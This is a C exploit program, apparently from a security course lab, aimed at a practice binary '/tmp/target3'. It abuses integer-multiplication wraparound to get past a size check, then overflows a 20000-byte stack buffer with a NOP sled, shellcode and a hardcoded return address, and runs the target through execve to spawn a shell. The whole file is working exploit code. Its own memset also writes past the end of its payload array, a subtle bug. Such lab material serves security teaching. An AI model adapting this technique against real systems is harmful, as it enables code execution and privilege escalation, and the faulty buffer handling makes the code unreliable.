#include <limits.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
	// sizeof(buf) 20000, 20004 is where we want eip. By linear search, we find
	// TARGET_OVERFLOW to be a suitable value for targetting the overflow size.
	// We overflow by 8 bytes, which overwrites only 2 words. This likely
	// overwrite (foo) ebp, eip.
	unsigned int BUFFER_BYTES = sizeof(char) * 20000;
	unsigned int TARGET_OVERFLOW = BUFFER_BYTES + 2 * sizeof(int);
	// We now search for an integer such that sploitsize_int * 20
	// is equal to TARGET_OVERFLOW when cast to an unsigned int. We also require
	// that sploitsize_int < 0.
	int sploitsize_int;
	unsigned int result;
	for (sploitsize_int = -1; sploitsize_int > INT_MIN; sploitsize_int--) {
		result = sploitsize_int * 20;
		if (result == TARGET_OVERFLOW) {
			break;
		}
	}
	if (sploitsize_int == INT_MIN) {
		printf("Exploit failed to find suitable exploit size! TARGET_OVERFLOW "
		       "= %d\n", TARGET_OVERFLOW);
	}
	// Create a string.
	unsigned int length = snprintf( NULL, 0, "%d",
	                                sploitsize_int); // Finds the length.
	char sploitstring[TARGET_OVERFLOW + length + /*comma*/ 1 + /*null*/ 1];
	if (length != snprintf((char*)&sploitstring,
	                       length + /*null*/1,
	                       "%d", sploitsize_int)) {
		printf("Something went wrong with creating integer string!!\n");
		return -1;
	}
	sploitstring[length] = ',';

	// Fill with NOOP.
	memset(sploitstring + length + 1, '\x90', sizeof(sploitstring));
	// Copy shell without null.
	memcpy(sploitstring + length + 100, shellcode, sizeof(shellcode) - 1);
	// Find the location of $eip and set it to the exploit code.
	int* ret = (int*)(sploitstring + length + 1 + BUFFER_BYTES + sizeof(int));
	*ret = 0xbfff6210;
	sploitstring[sizeof(sploitstring) - 1] = 0;

	char *args[] = { TARGET, sploitstring, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
